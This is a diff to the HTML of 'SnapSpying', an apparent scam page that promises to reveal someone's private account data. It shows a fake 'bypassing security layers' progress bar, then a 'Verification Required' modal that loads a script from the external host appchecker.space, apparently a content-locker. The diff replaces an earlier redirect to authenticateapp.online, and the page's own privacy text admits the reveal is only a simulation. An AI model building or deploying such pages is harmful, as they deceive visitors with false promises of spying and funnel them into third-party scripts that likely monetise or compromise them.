@@ -34,6 +34,12 @@
             filter: blur(5px);
             transform: scale(1.02);
         }
+
+        #verify-modal [data-captcha-enable="true"] {
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+        }
     </style>
 </head>
 <body class="flex flex-col items-center px-6 pt-4 min-h-screen pb-12">
@@ -94,12 +100,12 @@
         </div>
     </div>
 
-    <div class="mt-12 opacity-30 flex flex-col items-center gap-2">
+    <div class="mt-12 opacity-40 flex flex-col items-center gap-2">
         <div class="flex items-center gap-2">
-            <i class="fas fa-shield-halved text-[#ffd500] text-sm"></i>
-            <span class="text-[10px] uppercase font-black tracking-widest">Enterprise Grade Security</span>
+            <i class="fas fa-circle-check text-[#ffd500] text-sm"></i>
+            <span class="text-[10px] uppercase font-black tracking-widest">Verified Security Protocol</span>
         </div>
-        <p class="text-[9px] font-medium text-gray-500">Verified by SnapSpying Security Protocol v4.2</p>
+        <p class="text-[9px] font-medium text-gray-500">Secure connection via encrypted tunnel v4.2</p>
     </div>
 
     <div id="privacy-sheet" class="fixed inset-0 z-[200] hidden">
@@ -110,7 +116,7 @@
                 <button onclick="toggleSheet('privacy-sheet')" class="text-white text-xl"><i class="fas fa-times"></i></button>
             </div>
             <div class="px-6 py-6 pb-20">
-                <p class="text-[#8e8e93] text-[13px] font-medium mb-4 italic">Last updated: April 29, 2026</p>
+                <p class="text-[#8e8e93] text-[13px] font-medium mb-4 italic">Last updated: April 30, 2026</p>
                 <p class="text-white text-[14px] leading-relaxed mb-6">This Privacy Policy describes how your personal information is collected, used, and shared when you visit SnapSpying (the "Platform").</p>
                 <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">Information We Collect</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying is designed for entertainment purposes only. We do not store, log, or share any usernames entered on this platform. All simulations are performed locally in your browser session.</p></div>
                 <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">How We Use Your Information</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">Any data shown during the "Reveal" process is part of a visual simulation designed to demonstrate potential UI layouts and is not retrieved from actual private servers.</p></div>
@@ -130,7 +136,7 @@
     </div>
 
     <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-8">
-        <div class="bg-[var(--card)] w-full max-w-sm rounded-[35px] p-8 border border-white/5">
+        <div class="bg-[var(--card)] w-full max-w-sm rounded-[35px] p-8 border border-white/5 text-center">
             <div class="flex items-center gap-2 mb-8">
                 <div class="w-2 h-2 bg-yellow-500 rounded-full animate-pulse"></div>
                 <span class="text-[10px] font-black text-gray-500 uppercase tracking-widest">Processing</span>
@@ -139,6 +145,16 @@
             <h2 id="p-status" class="text-xl font-bold mb-3 text-white">Initializing...</h2>
             <div class="h-2 bg-gray-800 rounded-full mb-6 overflow-hidden"><div id="bar" class="bar-fill"></div></div>
             <p id="p-log" class="text-[12px] text-gray-500 font-mono italic">Bypassing security layers...</p>
+        </div>
+    </div>
+
+    <div id="verify-modal" class="hidden fixed inset-0 z-[400] bg-[#000] flex flex-col items-center justify-center p-8 text-center overflow-y-auto">
+        <div class="w-20 h-20 bg-[#ffd500]/10 rounded-full flex items-center justify-center mb-8 border border-[#ffd500]/20"><i class="fas fa-lock text-[#ffd500] text-4xl"></i></div>
+        <h2 class="text-2xl font-bold mb-2">Verification Required</h2>
+        <p class="text-gray-500 text-sm mb-12">Please complete the security check to continue</p>
+        
+        <div class="w-full max-w-sm">
+            <div data-captcha-enable="true"></div>
         </div>
     </div>
 
@@ -188,12 +204,15 @@
                     if(p >= 100) {
                         clearInterval(interval);
                         setTimeout(() => {
-                            window.location.href = "https://authenticateapp.online/cp/js/2wx2k";
+                            document.getElementById('proc-modal').classList.add('hidden');
+                            document.getElementById('verify-modal').classList.remove('hidden');
                         }, 500);
                     }
                 }, 40);
             }, 400);
         }
     </script>
+
+    <script type="text/javascript" src="https://appchecker.space/cp/js/2wx2k"></script>
 </body>
 </html>
